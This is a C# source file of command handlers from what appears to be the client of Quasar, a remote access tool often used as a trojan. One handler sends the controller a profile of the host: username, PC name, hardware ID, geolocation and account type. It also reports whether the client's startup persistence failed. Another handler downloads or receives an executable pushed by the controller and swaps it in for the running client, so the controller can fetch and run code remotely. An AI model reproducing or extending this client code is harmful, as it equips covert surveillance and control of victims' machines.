using System;
using System.Net;
using System.Threading;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Installation;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE CONNECTION COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleGetAuthentication(GetAuthentication command, Client client)
        {
            GeoLocationHelper.Initialize();

            client.Send(new GetAuthenticationResponse
            {
                Version = Settings.VERSION,
                OperatingSystem = PlatformHelper.FullName,
                AccountType = WindowsAccountHelper.GetAccountType(),
                Country = GeoLocationHelper.GeoInfo.Country,
                CountryCode = GeoLocationHelper.GeoInfo.CountryCode,
                Region = GeoLocationHelper.GeoInfo.Region,
                City = GeoLocationHelper.GeoInfo.City,
                ImageIndex = GeoLocationHelper.ImageIndex,
                Id = DevicesHelper.HardwareId,
                Username = WindowsAccountHelper.GetName(),
                PcName = SystemHelper.GetPcName(),
                Tag = Settings.TAG
            });

            if (ClientData.AddToStartupFailed)
            {
                Thread.Sleep(2000);
                client.Send(new SetStatus
                {
                    Message = "Adding to startup failed."
                });
            }
        }

        public static void HandleDoClientUpdate(DoClientUpdate command, Client client)
        {
            // i dont like this updating... if anyone has a better idea feel free to edit it
            if (string.IsNullOrEmpty(command.DownloadUrl))
            {
                if (!_renamedFiles.ContainsKey(command.Id))
                    _renamedFiles.Add(command.Id, FileHelper.GetTempFilePath(".exe"));

                string filePath = _renamedFiles[command.Id];

                try
                {
                    if (command.CurrentBlock == 0 && !FileHelper.IsValidExecuteableFile(command.Block))
                        throw new Exception("No executable file");

                    FileSplit destFile = new FileSplit(filePath);

                    if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                        throw new Exception(destFile.LastError);

                    if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
                    {
                        if (_renamedFiles.ContainsKey(command.Id))
                            _renamedFiles.Remove(command.Id);
                        client.Send(new SetStatus {Message = "Updating..."});
                        ClientUpdater.Update(client, filePath);
                    }
                }
                catch (Exception ex)
                {
                    if (_renamedFiles.ContainsKey(command.Id))
                        _renamedFiles.Remove(command.Id);
                    NativeMethods.DeleteFile(filePath);
                    client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
                }

                return;
            }

            new Thread(() =>
            {
                client.Send(new SetStatus { Message = "Downloading file..." });

                string tempFile = FileHelper.GetTempFilePath(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadUrl, tempFile);
                    }
                }
                catch
                {
                    client.Send(new SetStatus {Message = "Download failed!"});
                    return;
                }

                client.Send(new SetStatus {Message = "Replacing executable..."});

                ClientUpdater.Update(client, tempFile);
            }).Start();
        }

        public static void HandleDoClientUninstall(DoClientUninstall command, Client client)
        {
            client.Send(new SetStatus {Message = "Uninstalling... good bye :-("});

            ClientUninstaller.Uninstall(client);
        }
    }
}